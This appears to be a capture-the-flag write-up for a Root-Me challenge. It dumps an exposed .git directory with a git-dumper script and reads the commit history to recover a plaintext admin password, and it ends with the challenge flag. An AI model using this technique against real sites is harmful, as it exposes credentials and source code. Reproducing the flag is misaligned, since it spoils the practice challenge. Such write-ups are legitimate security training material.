@@ -1,0 +1,55 @@
+http://challenge01.root-me.org/web-serveur/ch61/.git/
+ 
+
+blue team want sha256!!!!!!!!!
+# Please enter the commit message for your changes. Lines starting
+# with '#' will be ignored, and an empty message aborts the commit.
+#
+# Author:    John <john@bs-corp.com>
+#
+# On branch master
+# Changes to be committed:
+#	modified:   config.php
+#	modified:   index.php
+#
+# Untracked files:
+#	._nginx.server-level.inc
+#
+
+0000000000000000000000000000000000000000 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32 John <john@bs-corp.com> 1567674615 +0200	commit (initial): Initial commit for the new HR database access
+5e0e146e2242cb3e4b836184b688a4e8c0e2cc32 1572c85d624a10be0aa7b995289359cc4c0d53da John <john@bs-corp.com> 1568279406 +0200	commit: secure auth with md5
+1572c85d624a10be0aa7b995289359cc4c0d53da a8673b295eca6a4fa820706d5f809f1a8b49fcba John <john@bs-corp.com> 1569148712 +0200	commit: changed password
+a8673b295eca6a4fa820706d5f809f1a8b49fcba 550880c40814a9d0c39ad3485f7620b1dbce0de8 John <john@bs-corp.com> 1569244207 +0200	commit: renamed app name
+550880c40814a9d0c39ad3485f7620b1dbce0de8 c0b4661c888bd1ca0f12a3c080e4d2597382277b John <john@bs-corp.com> 1569607805 +0200	commit: blue team want sha256!!!!!!!!!
+
+
+use Dumper Gittools with folowing commands : 
+<code> ./gitdumper.sh http://challenge01.root-me.org/web-serveur/ch61/.git/ ../output </code>
+cd ../output/.git
+git log
+git log -p -10
+
+
+On se connecte sur la branche du depot distant grâce aux meta données contenu dans .git. On a donc accès aux dernieres modifications, les commits effectués.
+On list les commit grâce a git log. Puis on regarde en profondeur grâce a git log -p 10
+
+
+$username = "admin";
+-       $password = "s3cureP@ssw0rd";
++       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
+diff --git a/index.php b/index.php
+index f7237d0..2e620c1 100755
+--- a/index.php
++++ b/index.php
+@@ -13,7 +13,7 @@
+                <?php
+                        include('./config.php');
+                        if(isset($_POST['username']) && isset($_POST['password'])){
+-                               if ($_POST['username'] == $username && md5($_POST['password']) == md5($password)){
++                               if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password){
+                                        echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
+                                        echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
+
+
+
+flag=s3cureP@ssw0rd
